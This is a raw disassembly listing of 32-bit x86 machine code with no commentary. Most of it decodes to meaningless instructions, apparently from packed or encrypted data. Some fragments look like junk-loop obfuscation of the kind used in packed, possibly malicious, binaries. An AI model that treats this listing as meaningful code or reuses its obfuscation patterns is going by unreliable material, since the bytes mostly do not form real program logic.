  417d09:	fsub   st,st(7)
  417d0b:	test   BYTE PTR [ebx-0x80],0x3c
  417d0f:	retf   0x6cfc
  417d12:	pop    esi
  417d13:	ss sti 
  417d15:	pushf  
  417d16:	clc    
  417d17:	lsl    ebx,WORD PTR [eax-0x56]
  417d1b:	push   cs
  417d1c:	leave  
  417d1d:	mov    cl,0x1b
  417d1f:	xor    eax,0xc995a488
  417d24:	xor    DWORD PTR [edi+0x581f8384],esp
  417d2a:	mov    edx,0x51f06068
  417d2f:	mov    eax,ds:0x3fe9074
  417d34:	inc    esp
  417d35:	jg     0x417da1
  417d37:	pop    edx
  417d38:	(bad)  
  417d39:	and    eax,0xc499d352
  417d3e:	inc    edi
  417d3f:	ins    BYTE PTR es:[edi],dx
  417d40:	jp     0x417d28
  417d42:	jle    0x417d66
  417d44:	mov    eax,edx
  417d46:	(bad)  
  417d48:	add    ebp,esp
  417d4a:	fistp  QWORD PTR [ebp+0x1514c9b1]
  417d50:	cmp    dh,BYTE PTR [eax+edx*1+0x1f80e876]
  417d57:	cmp    eax,0xb23886b1
  417d5c:	pop    es
  417d5d:	xor    eax,0x7510850
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a801,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a801
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a801,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a801,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a801,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a805
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a77d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a83d,0x42a831
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a835,0x42a889
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a775,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a835,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a80d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a759,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a7f1,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a7f1
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a7f1,esi
  417e51:	cmp    DWORD PTR ds:0x42a7f1,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a7f1,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	(bad)  
  417e8d:	call   0x1f1f1bfb
  417e92:	aaa    
  417e93:	jg     0x417f0d
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	jmp    0x9c09:0x427ea251
  417ea0:	xor    BYTE PTR [edx],ch
  417ea2:	jecxz  0x417e58
  417ea4:	mov    bl,0x9e
  417ea6:	cmp    edi,edx
  417ea8:	sbb    DWORD PTR [esi],0x9fa55dec
  417eae:	push   ss
  417eaf:	inc    ebp
  417eb0:	rcr    BYTE PTR [esi-0x6c4ce316],1
  417eb6:	fld    TBYTE PTR [esi+0x6cbd4bb1]
  417ebc:	fiadd  WORD PTR [ecx+edi*2-0x126de973]
  417ec3:	cmp    eax,0xbe4b6483
  417ec8:	push   eax
  417ec9:	out    0xf2,eax
  417ecb:	jle    0x417eaf
  417ecd:	mov    ebp,0xe907d4d1
  417ed2:	jnp    0x417f0a
  417ed4:	inc    ebp
  417ed5:	xor    ch,dh
  417ed7:	fidivr DWORD PTR [esi]
  417ed9:	mov    al,ds:0x9eb94271
  417ede:	cmp    al,BYTE PTR [ebx-0x77]
  417ee1:	and    eax,0xc608c64d
  417ee6:	cmp    ebx,DWORD PTR [esi+0x25e8ca00]
  417eec:	mov    al,fs:0x736ed05e
  417ef2:	mov    eax,0xc3025ee5
  417ef7:	mov    esp,DWORD PTR [eax-0x7213bf15]
  417efd:	hlt    
  417efe:	jp     0x417f0b
  417f00:	mov    ebx,es
  417f02:	cwde   
  417f03:	inc    esi
  417f04:	lods   al,BYTE PTR ds:[esi]
  417f05:	lods   al,BYTE PTR cs:[esi]
  417f07:	in     al,dx
  417f08:	jo     0x417eb2
  417f0a:	mov    bh,0x51
  417f0c:	je     0x417f54
  417f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f0f:	mov    dh,0x28
  417f11:	sub    BYTE PTR [edi+0x3bcf9481],0x69
  417f18:	mov    ebp,DWORD PTR [edi+0x2146a4f]
  417f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f1f:	add    al,0x3b
  417f21:	ret    
  417f22:	mov    ds:0x662983a5,eax
  417f27:	int3   
  417f28:	mov    ebx,0x7fbcf4f2
  417f2d:	cmp    eax,0xaa30be88
  417f32:	ds inc ebx
  417f34:	daa    
  417f35:	sti    
  417f36:	cli    
  417f37:	js     0x417fa5
  417f39:	leave  
  417f3a:	or     al,0x98
  417f3c:	arpl   WORD PTR [ecx+0xfe141f3],ax
  417f42:	call   0xd9595833
  417f47:	popa   
  417f48:	loopne 0x417f4d
  417f4a:	pop    esp
  417f4b:	mov    ecx,0x3d74f6c5
  417f50:	push   edx
  417f51:	mov    ch,0x2
  417f53:	dec    ecx
  417f54:	jno    0x417f54
  417f56:	dec    ecx
  417f57:	jno    0x417fa2
  417f59:	in     eax,dx
  417f5a:	into   
  417f5b:	out    dx,eax
  417f5c:	cmp    al,0x4c
  417f5e:	jb     0x417f97
  417f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f61:	xor    bh,BYTE PTR [esi+0x40]
  417f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f65:	sub    eax,0xfc8050b7
  417f6a:	or     cl,al
  417f6c:	push   ebx
  417f6d:	add    BYTE PTR [eax-0x7b],ch
  417f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f71:	and    bh,ch
  417f73:	fwait
  417f74:	popa   
  417f75:	adc    bl,BYTE PTR ds:0x952436ce
  417f7b:	inc    edx
  417f7c:	xor    al,0x2b
  417f7f:	out    dx,al
  417f80:	add    ebp,DWORD PTR [edi-0x2c071ce1]
  417f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f87:	ror    BYTE PTR [edx],0x51
  417f8a:	loope  0x417fde
  417f8c:	sahf   
  417f8d:	cld    
  417f8e:	ins    DWORD PTR es:[edi],dx
  417f8f:	fs ds cs pop ss
  417f93:	dec    edi
  417f94:	mov    cl,0x69
  417f96:	push   es
  417f97:	aad    0xc6
  417f99:	cmc    
  417f9a:	push   cs
  417f9b:	sti    
  417f9c:	dec    eax
  417f9d:	mov    esp,0x6eec7135
  417fa2:	push   esp
  417fa3:	jmp    0x328a:0x85bbf6ed
  417faa:	add    BYTE PTR [eax-0x562e7963],al
  417fb0:	sbb    bl,BYTE PTR [edx-0x9]
  417fb3:	fisttp DWORD PTR [eax+edi*8-0x3a]
  417fb7:	hlt    
  417fb8:	fcmovbe st,st(2)
  417fba:	dec    esp
  417fbb:	mov    al,0x0
  417fbd:	aas    
  417fbe:	inc    ebx
  417fbf:	pop    ds
  417fc0:	xchg   ebx,eax
  417fc1:	mov    bl,0xbe
  417fc3:	jo     0x418026
  417fc5:	mov    ds:0xd38a54bb,eax
  417fca:	lods   al,BYTE PTR ds:[esi]
  417fcb:	fnsave [esi-0x321f6146]
  417fd1:	xor    eax,0xc6c19277
  417fd6:	lahf   
  417fd7:	sub    DWORD PTR [edi],edx
  417fd9:	jno    0x417fdb
  417fdb:	mul    DWORD PTR [eax]
  417fdd:	rdmsr  
  417fdf:	ss ja  0x417fce
  417fe2:	iret   
  417fe3:	add    ecx,DWORD PTR [eax]
  417fe5:	adc    edx,DWORD PTR [ebx+0x36]
  417fe8:	je     0x417f9d
  417fea:	push   ebx
  417feb:	push   esi
  417fec:	xchg   ebp,eax
  417fed:	add    DWORD PTR [eax],ecx
  417fef:	(bad)  
  417ff0:	or     al,0x6c
  417ff2:	push   0xb6c72b4f
  417ff7:	pop    ebp
  417ff8:	sub    BYTE PTR [edi-0xd],0x17
  417ffc:	xchg   edx,eax
  417ffd:	(bad)  
  417ffe:	dec    edi
  417fff:	popa   
  418000:	int    0x0
  418002:	(bad)  
  418003:	mov    eax,ds:0xb400f2dd
  418008:	leave  
  418009:	xor    ebp,DWORD PTR [edi]
  41800b:	jae    0x417fa1
  41800d:	mov    al,0xfc
  41800f:	dec    ecx
  418010:	add    bl,dh
  418012:	mov    dh,0x5d
  418014:	or     edi,ebx
  418016:	cdq    
  418017:	fcomp  DWORD PTR [ecx]
  418019:	add    al,0xf8
  41801b:	jo     0x41802f
  41801d:	mov    al,ds:0xc7a411d4
  418022:	inc    ecx
  418023:	pop    esi
  418024:	push   0xffffffcb
  418026:	dec    ebx
  418027:	loopne 0x417fee
  418029:	mov    ecx,0x20dbb0b0
  41802e:	pop    edx
  41802f:	cs xor ecx,ecx
  418032:	jnp    0x4180a5
  418034:	and    BYTE PTR [ecx-0x3b4193f5],0x86
  41803b:	dec    ecx
  41803c:	popa   
  41803d:	imul   esp,DWORD PTR [edx+0x11],0x5074493a
  418044:	test   eax,0x78a8ad1e
  418049:	mov    al,BYTE PTR [esi+0x3c4ddbe1]
  41804f:	mov    esp,0x760fc41e
  418054:	mov    dl,0xce
  418056:	sbb    ebx,DWORD PTR [esi]
  418058:	lahf   
  418059:	jmp    0xfaf9c775
  41805e:	shl    DWORD PTR [ebp-0x452cfce7],1
  418064:	call   0x5387:0xe0881c02
  41806b:	icebp  
  41806c:	(bad)  
  41806d:	mov    esi,DWORD PTR [eax-0x6e166a91]
  418073:	aad    0xbd
  418075:	loop   0x4180d5
  418077:	outs   dx,DWORD PTR ds:[esi]
  418078:	or     eax,0xa810def2
  41807d:	xchg   ecx,eax
  41807e:	pop    edi
  41807f:	mov    dh,cl
  418081:	hlt    
  418082:	les    edx,FWORD PTR [esi-0x53bec6ad]
  418088:	dec    ecx
  418089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41808a:	sti    
  41808b:	mov    ecx,0x8511a99d
  418090:	aad    0x17
  418092:	inc    ecx
  418093:	xchg   ebx,eax
  418094:	pushf  
  418095:	pop    edx
  418096:	lahf   
  418097:	aad    0xc9
  418099:	mov    cl,0x46
  41809b:	jmp    0xe737:0x754feeb9
  4180a2:	std    
  4180a3:	cdq    
  4180a4:	lea    ebp,[eax+0x2eb831fa]
  4180aa:	add    esi,DWORD PTR [edx+eax*2-0x21]
  4180ae:	std    
  4180af:	xchg   ebx,eax
  4180b0:	and    al,0xbc
  4180b2:	test   al,0xe2
  4180b4:	xchg   esi,eax
  4180b5:	ins    DWORD PTR es:[edi],dx
  4180b6:	mov    ecx,0xe4fb7b3d
  4180bb:	dec    esi
  4180bc:	push   ecx
  4180bd:	push   ecx
  4180be:	outs   dx,DWORD PTR ds:[esi]
  4180bf:	lods   eax,DWORD PTR ds:[esi]
  4180c0:	xchg   BYTE PTR [ecx+esi*4-0x7102957f],ch
  4180c7:	push   ss
  4180c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180c9:	pushf  
  4180ca:	pop    ebp
  4180cb:	loop   0x4180e2
  4180cd:	pop    edi
  4180ce:	test   DWORD PTR ds:0xea8ecbee,ebp
  4180d4:	dec    esi
  4180d5:	ret    0x7cc7
  4180d8:	add    BYTE PTR [esi+0x55030e28],bl
  4180de:	call   0x86ea:0x1d70b94f
  4180e5:	ss (bad) 
  4180e7:	jns    0x418166
  4180e9:	rcr    DWORD PTR [ebx],1
  4180eb:	xchg   DWORD PTR [ecx+0x45],ebx
  4180ee:	clc    
  4180ef:	es xor al,0x1f
  4180f2:	das    
  4180f3:	sub    BYTE PTR [eax+0x1],bh
  4180f6:	xchg   edi,eax
  4180f7:	dec    ecx
  4180f8:	pop    ecx
  4180f9:	lea    esp,[ebx+edi*8]
  4180fc:	je     0x41816f
  4180fe:	inc    edx
  4180ff:	cmp    al,0x30
  418101:	pop    ecx
  418102:	(bad)  
  418103:	jg     0x418089
  418105:	loope  0x418142
  418107:	pop    ss
  418108:	push   ds
  418109:	dec    edx
  41810a:	ror    BYTE PTR [ecx],cl
  41810c:	mov    edi,DWORD PTR [ecx]
  41810e:	pop    es
  41810f:	es call 0x9f0e:0x1b091daf
  418117:	test   al,0xaf
  418119:	int3   
  41811a:	jns    0x418168
  41811c:	sbb    eax,0x119bf885
  418121:	jno    0x41817e
  418123:	loopne 0x418113
  418125:	stos   BYTE PTR es:[edi],al
  418126:	int3   
  418127:	(bad)  [edi]
  418129:	sub    dh,BYTE PTR [edx+edx*4-0x71be931]
  418130:	fild   QWORD PTR [ebx]
  418132:	dec    esp
  418133:	jne    0x41812d
  418135:	rcr    BYTE PTR [edi+0x1496d5f6],0x45
  41813c:	mov    ds:0x30ba81c3,eax
  418141:	or     eax,0x6f407aaa
  418146:	cmp    DWORD PTR [ebp-0x1bb9b0a3],esp
  41814c:	ss ins DWORD PTR es:[edi],dx
  41814e:	mov    edi,0xf9eddba2
  418153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418154:	int    0x7
  418156:	lds    edx,FWORD PTR [edi-0x75540f18]
  41815c:	(bad)  
  41815d:	cdq    
  41815e:	jb     0x418197
  418160:	add    cl,al
  418162:	xchg   DWORD PTR [edi+0x76],edx
  418165:	daa    
  418166:	sbb    al,0x9f
  418168:	dec    ecx
  418169:	sub    edi,DWORD PTR [ecx-0x77]
  41816c:	not    DWORD PTR [ebx+0x2b]
  41816f:	mov    ecx,0xca10efe4
  418174:	fst    DWORD PTR [edi+0x12]
  418177:	mov    ds:0x6cde733d,al
  41817c:	pop    ebx
  41817d:	add    DWORD PTR [eax+0x7b72420a],ebx
  418183:	jmp    0x2522d481
  418188:	outs   dx,DWORD PTR ds:[esi]
  418189:	sbb    al,0xc8
  41818b:	retf   0xfa52
  41818e:	mov    ebp,0x376a8a33
  418193:	test   eax,0x758b2e07
  418198:	or     al,0x33
  41819a:	enter  0xf033,0x8d
  41819e:	mov    WORD PTR [esi],cs
  4181a0:	cwde   
  4181a1:	jb     0x4181d5
  4181a3:	add    BYTE PTR [ebx],dh
  4181a5:	enter  0x15e9,0x3
  4181a9:	add    BYTE PTR [eax],al
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	pop    ds
  4181b8:	rol    DWORD PTR [ebx+edi*4+0x19],1
  4181bc:	xor    al,0x7f
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x4181df
  4181c4:	mov    dl,BYTE PTR ds:0xfdf9b444
  4181ca:	hlt    
  4181cb:	add    eax,0x906f1846
  4181d0:	jmp    0x7831:0x2816d4ac
  4181d7:	(bad)  
  4181d8:	mov    cl,0xc3
  4181da:	lea    esp,ds:0xe8f67297
  4181e0:	jmp    FWORD PTR [ebp+0x3f]
  4181e3:	dec    ebp
  4181e4:	add    edx,DWORD PTR [ebp+0x541a3ce4]
  4181ea:	call   0xe5a5e29d
  4181ef:	ror    DWORD PTR [eax],0x39
  4181f2:	fs and bl,al
  4181f5:	int3   
  4181f6:	addr16 push es
  4181f8:	mov    edx,0xfc9f4ae7
  4181fd:	inc    esp
  4181fe:	inc    BYTE PTR [ebp+0x14]
  418201:	mov    dl,0x7d
  418203:	clc    
  418204:	in     eax,dx
  418205:	sbb    ebp,DWORD PTR [ecx]
  418207:	daa    
  418208:	es add al,0x7a
  41820b:	add    BYTE PTR [ebx+edx*8+0x6b],dh
  41820f:	aas    
  418210:	test   eax,0xe06ab05b
  418215:	or     BYTE PTR es:[ecx-0x1e],ah
  418219:	jmp    0x1c73:0xf9e846cf
  418220:	inc    ebp
  418221:	mov    cl,0x3b
  418223:	stos   BYTE PTR es:[edi],al
  418224:	mov    edx,0x5ff3f4ea
  418229:	shl    BYTE PTR [edi+ebp*1-0x7ef0234d],0x24
  418231:	jmp    FWORD PTR [ebx+0x70]
  418234:	outs   dx,BYTE PTR ds:[esi]
  418235:	test   al,0xd3
  418237:	jge    0x4181c3
  418239:	mov    ecx,0xff0fb514
  41823e:	xlat   BYTE PTR ds:[ebx]
  41823f:	or     esi,DWORD PTR [esi-0x3602f264]
  418245:	(bad)  
  418247:	add    al,0xdf
  418249:	out    dx,al
  41824a:	and    DWORD PTR [ebp+0xd152729],esp
  418250:	arpl   bp,di
  418252:	adc    DWORD PTR [edx],esp
  418254:	mov    BYTE PTR [ebx+0x622074e],bl
  41825a:	ins    DWORD PTR es:[edi],dx
  41825b:	mov    bh,0xb4
  41825d:	out    0x15,eax
  41825f:	xchg   esi,eax
  418260:	lds    edi,FWORD PTR [bp+di+0x525d]
  418265:	inc    edi
  418266:	mov    eax,ds:0xcf2d370f
  41826b:	xchg   edi,eax
  41826c:	cmp    DWORD PTR [esi+ecx*4-0x2c],ecx
  418270:	cmp    ebp,DWORD PTR [ebx-0x23991f2c]
  418276:	aam    0x78
  418278:	sub    bl,ch
  41827a:	repnz push esi
  41827c:	xchg   ecx,eax
  41827d:	pop    ebp
  41827e:	xchg   ecx,eax
  41827f:	fwait
  418280:	jae    0x418214
  418282:	out    0x3a,eax
  418284:	jne    0x41821d
  418286:	aad    0x9d
  418288:	cs pop edi
  41828a:	sub    eax,0xeebc1e9e
  41828f:	pop    ds
  418290:	int3   
  418291:	adc    BYTE PTR [eax+0x3e8219e8],bl
  418297:	lods   al,BYTE PTR ds:[esi]
  418298:	fwait
  418299:	or     al,0xfc
  41829b:	test   al,0x85
  41829d:	mov    ds:0xb63364e3,eax
  4182a2:	cmp    BYTE PTR [ebx-0x45d6b254],0x85
  4182a9:	pop    ds
  4182aa:	add    BYTE PTR [edx-0x71],al
  4182ad:	repz ret 0xf0e2
  4182b1:	sahf   
  4182b2:	mov    esi,0x509107a1
  4182b7:	aad    0xd2
  4182b9:	and    esi,DWORD PTR [eax+0x233cc8b4]
  4182bf:	int    0x37
  4182c1:	retf   0xc834
  4182c4:	jecxz  0x41832b
  4182c6:	jnp    0x4182d5
  4182c8:	mov    al,0xa7
  4182ca:	addr16 in eax,0x2a
  4182cd:	pop    eax
  4182ce:	scas   eax,DWORD PTR es:[edi]
  4182cf:	adc    dh,dh
  4182d1:	mov    ebp,DWORD PTR [edx+ebx*1+0x5d]
  4182d5:	neg    DWORD PTR [ecx]
  4182d7:	nop
  4182d8:	push   es
  4182d9:	dec    ebp
  4182da:	jl     0x418337
  4182dc:	or     eax,DWORD PTR [edx+0x1]
  4182df:	push   0xffffffc4
  4182e1:	jl     0x4182b0
  4182e3:	out    dx,eax
  4182e4:	cmp    ah,ch
  4182e6:	mov    ch,0x38
  4182e8:	lahf   
  4182e9:	cmp    eax,0xeff3944a
  4182ee:	ss popf 
  4182f0:	pop    edi
  4182f1:	add    cl,ah
  4182f3:	hlt    
  4182f4:	pusha  
  4182f5:	push   eax
  4182f6:	ret    0xf084
  4182f9:	mov    eax,ds:0xe164bb7
  4182fe:	cwde   
  4182ff:	in     eax,0x4e
  418301:	shl    DWORD PTR [ebp+0x75119d36],1
  418307:	jns    0x418379
  418309:	shr    esp,1
  41830b:	sbb    BYTE PTR [eiz*4-0x299c1aaf],ch
  418312:	cmp    dl,BYTE PTR [ebp+0x2f5334ff]
  418318:	mov    dh,0xf8
  41831a:	in     al,dx
  41831b:	jmp    0x66c3:0x377024a0
  418322:	mov    bh,0xcb
  418324:	mov    esp,0xf6b2362a
  418329:	adc    edx,eax
  41832b:	and    ebp,ebx
  41832d:	loop   0x41837c
  41832f:	cmp    esi,ebx
  418331:	lock pushf 
  418333:	and    al,0xfc
  418335:	mov    esi,0xaa120b61
  41833a:	xchg   esi,eax
  41833b:	ins    BYTE PTR es:[edi],dx
  41833c:	addr16 jo 0x4182c3
  41833f:	aam    0x4b
  418341:	je     0x41835b
  418343:	pop    ecx
  418344:	call   FWORD PTR [esi-0x4f]
  418347:	and    cl,BYTE PTR [ebx+0x3]
  41834a:	cmp    BYTE PTR [ebp+0x68355db0],bh
  418350:	test   eax,0x50f850e8
  418355:	clc    
  418356:	pop    ebp
  418357:	das    
  418358:	sahf   
  418359:	(bad)  
  41835a:	sub    eax,0xbdb04a3
  41835f:	mov    bl,0xf
  418361:	dec    eax
  418362:	xbegin 0xf3f9c459
  418368:	mov    edx,DWORD PTR [ecx]
  41836a:	jge    0x4183b0
  41836c:	cld    
  41836d:	adc    cl,BYTE PTR [edx+0x6e]
  418370:	shr    BYTE PTR [esi],0x10
  418373:	fs ret 0x96d2
  418377:	outs   dx,DWORD PTR ds:[esi]
  418378:	out    dx,al
  418379:	call   0x8b6d:0x8b2a3798
  418380:	mov    ds:0x7a5939f3,al
  418385:	fcomp  DWORD PTR [ebx+eax*4+0x71]
  418389:	sahf   
  41838a:	adc    al,0xd2
  41838c:	sub    DWORD PTR [ecx+0x75],eax
  41838f:	push   edx
  418390:	jg     0x41839d
  418392:	mov    al,0x69
  418394:	(bad)  
  418395:	adc    BYTE PTR [ecx+eiz*2],ch
  418398:	xor    edi,esi
  41839a:	arpl   WORD PTR [eax],si
  41839c:	push   ebx
  41839d:	jns    0x418359
  41839f:	jecxz  0x4183c6
  4183a1:	les    edi,FWORD PTR [eax]
  4183a3:	outs   dx,BYTE PTR ds:[esi]
  4183a4:	lds    ebp,FWORD PTR [eax+0x5d645e2d]
  4183aa:	cmp    ebx,DWORD PTR [ecx-0x58c1302e]
  4183b0:	lea    edi,[ecx-0x55]
  4183b3:	or     BYTE PTR ds:0x839762c2,bh
  4183b9:	repz or DWORD PTR [edi+0x69],esi
  4183bd:	cld    
  4183be:	in     eax,0x94
  4183c0:	sub    bl,cl
  4183c2:	aaa    
  4183c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183c4:	add    edi,edi
  4183c6:	pop    ecx
  4183c7:	push   esi
  4183c8:	inc    ebx
  4183c9:	pop    ss
  4183ca:	lahf   
  4183cb:	test   eax,0x854294c0
  4183d0:	in     eax,dx
  4183d1:	outs   dx,DWORD PTR ds:[esi]
  4183d2:	sbb    dh,dh
  4183d4:	jle    0x418401
  4183d6:	out    dx,al
  4183d7:	(bad)  
  4183d8:	mov    dh,0x9e
  4183da:	xlat   BYTE PTR ds:[ebx]
  4183db:	hlt    
  4183dc:	jbe    0x4183b4
  4183de:	pop    ebp
  4183df:	add    al,0x82
  4183e1:	jb     0x41839b
  4183e3:	scas   eax,DWORD PTR es:[edi]
  4183e4:	sub    al,0xd3
  4183e6:	or     bl,BYTE PTR [eax]
  4183e8:	fiadd  WORD PTR [edi+edi*1]
  4183eb:	js     0x418455
  4183ed:	rol    DWORD PTR [edx-0x32],0x88
  4183f1:	cmp    BYTE PTR [eax],al
  4183f3:	leavew 
  4183f5:	nop
  4183f6:	xlat   BYTE PTR ds:[ebx]
  4183f7:	push   ebx
  4183f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183f9:	mov    dh,0xd
  4183fb:	pop    esp
  4183fc:	stos   DWORD PTR es:[edi],eax
  4183fd:	hlt    
  4183fe:	lahf   
  4183ff:	adc    ebx,eax
  418401:	mov    eax,ds:0x1d50f23
  418406:	mov    bl,0x3e
  418408:	push   ebp
  418409:	jae    0x4183ea
  41840b:	jns    0x41842b
  41840d:	push   edi
  41840e:	imul   ebp,DWORD PTR [edi-0x5b],0x57
  418412:	cld    
  418413:	xchg   al,bl
  418415:	mov    ecx,0x4128a86b
  41841a:	loopne 0x41839c
  41841c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41841d:	lods   al,BYTE PTR ds:[esi]
  41841e:	mov    ebx,0xb0b9f21b
  418423:	sbb    eax,0xa95aa541
  418428:	mov    ebp,DWORD PTR [esi+0x6e1d87fa]
  41842e:	fimul  WORD PTR [ebx-0x5c72b0d5]
  418434:	sub    eax,0x3ca330b9
  418439:	pop    ds
  41843a:	xor    eax,0x624c7c08
  41843f:	ret    
  418440:	dec    ebp
  418441:	pop    ecx
  418442:	mov    ah,0xb
  418444:	dec    esp
  418445:	push   edx
  418446:	inc    edi
  418447:	ins    DWORD PTR es:[edi],dx
  418448:	clc    
  418449:	adc    eax,0x8665b3d
  41844e:	mov    WORD PTR [edi],cs
  418450:	lods   al,BYTE PTR ds:[esi]
  418451:	test   eax,0x4ed7ad76
  418456:	fwait
  418457:	call   0xe2a9155f
  41845c:	vpandn ymm5,ymm4,YMMWORD PTR [ebx+ebx*8]
  418461:	mov    al,ds:0xe5e872d8
  418466:	sti    
  418467:	mov    BYTE PTR [eax+0x32b29dc8],dl
  41846d:	mov    dl,0xad
  41846f:	add    DWORD PTR [eax],0x83845fe4
  418475:	clc    
  418476:	add    eax,edx
  418478:	lahf   
  418479:	push   esp
  41847a:	ins    BYTE PTR es:[edi],dx
  41847b:	sahf   
  41847c:	mov    esp,0x92f52834
  418481:	ret    0xe9b1
  418484:	or     eax,0x227b44b6
  418489:	icebp  
  41848a:	push   ds
  41848b:	rcl    esp,0x34
  41848e:	(bad)  
  41848f:	or     BYTE PTR [edi+ebp*2],dl
  418492:	mov    bh,ah
  418494:	and    al,BYTE PTR [ebx]
  418496:	imul   edi,DWORD PTR [esi+0x54],0x41cb8ee9
  41849d:	aam    0x86
  41849f:	scas   al,BYTE PTR es:[edi]
  4184a0:	jmp    0xafd0:0xb8d86432
  4184a7:	xor    eax,0x83e911bc
  4184ac:	lahf   
  4184ad:	jae    0x4184bc
  4184af:	fst    QWORD PTR [edx+0x7bc615e6]
  4184b5:	idiv   DWORD PTR [ebx]
  4184b7:	out    dx,al
  4184b8:	push   es
  4184b9:	xor    BYTE PTR [esi-0xc0cf831],cl
  4184bf:	push   esp
  4184c0:	cmp    ecx,0xf89c8528
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0xc2ec6d48
  4184e3:	in     al,dx
  4184e4:	or     eax,ebp
  4184e6:	adc    al,0x39
  4184e8:	jg     0x418562
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	popa   
  4184ef:	mov    al,cl
  4184f1:	sbb    al,0x3d
  4184f3:	lahf   
  4184f4:	call   0x9f81:0x47373ec5
  4184fb:	inc    ebp
  4184fc:	pop    ss
  4184fd:	or     BYTE PTR [edx],dl
  4184ff:	pop    ebp
  418500:	out    0x87,al
  418502:	and    esp,ebx
  418504:	imul   esi,DWORD PTR [esi],0xf79aa47f
  41850a:	divps  xmm3,XMMWORD PTR [edx+edx*8+0x651f96f0]
  418512:	lods   al,BYTE PTR ds:[esi]
  418513:	mov    eax,ds:0x989f4639
  418518:	pop    ebp
  418519:	mov    WORD PTR [esi-0x5f299e35],?
  41851f:	dec    eax
  418520:	repz pop ebx
  418522:	daa    
  418523:	bound  ebx,QWORD PTR [ebp+0x70]
  418526:	jecxz  0x418567
  418528:	inc    edi
  418529:	adc    DWORD PTR [eax-0x21],eax
  41852c:	loope  0x418504
  41852e:	sbb    al,0x94
  418530:	cmp    eax,esp
  418532:	fcomp  QWORD PTR [edx]
  418534:	xor    BYTE PTR [ebx+0x77],cl
  418537:	pop    ebx
  418538:	sbb    al,0x2
  41853a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41853b:	sbb    eax,0x69784336
  418540:	xchg   edx,eax
  418541:	pop    ebp
  418542:	int    0xf
  418544:	dec    eax
  418545:	xor    BYTE PTR [edx+0x12],dl
  418548:	les    eax,FWORD PTR [edi-0x2b]
  41854b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41854c:	rol    BYTE PTR [eax-0x677cc44a],1
  418552:	add    DWORD PTR [esi+0x5a],ebp
  418555:	loope  0x4184dd
  418557:	and    BYTE PTR [edi-0x1b],bl
  41855a:	ret    
  41855b:	pop    ebp
  41855c:	sahf   
  41855d:	xchg   ecx,eax
  41855e:	dec    ecx
  41855f:	gs enter 0x2468,0x1
  418564:	dec    ebx
  418565:	mov    ch,0xc8
  418567:	out    dx,eax
  418568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418569:	push   0xffffffa6
  41856b:	pop    esp
  41856c:	aas    
